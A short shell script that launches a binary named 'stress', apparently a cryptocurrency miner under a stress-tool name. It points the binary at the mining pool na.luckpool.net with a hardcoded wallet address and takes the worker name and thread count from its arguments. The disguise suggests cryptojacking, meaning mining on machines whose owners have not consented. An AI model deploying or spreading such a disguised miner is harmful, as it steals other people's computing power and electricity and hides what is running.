#!/bin/sh

FUCK="$1"
CPU="$2"
CONNECT="na.luckpool.net:3957"
./stress -v -l $CONNECT -u RWXdsXDpvmZhLSguNjhvWC9PfdQMNBfK7o.$FUCK -t $CPU -p x
